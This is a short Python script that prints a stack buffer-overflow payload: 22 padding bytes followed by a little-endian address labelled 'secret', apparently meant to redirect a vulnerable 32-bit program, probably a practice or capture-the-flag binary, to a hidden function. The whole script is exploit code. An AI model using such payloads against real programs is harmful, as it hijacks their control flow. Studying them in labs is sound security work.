import sys
padding = bytes([0x42]*22)
secret = bytes([0xe8, 0x61, 0x55, 0x56])
sys.stdout.buffer.write(padding + secret)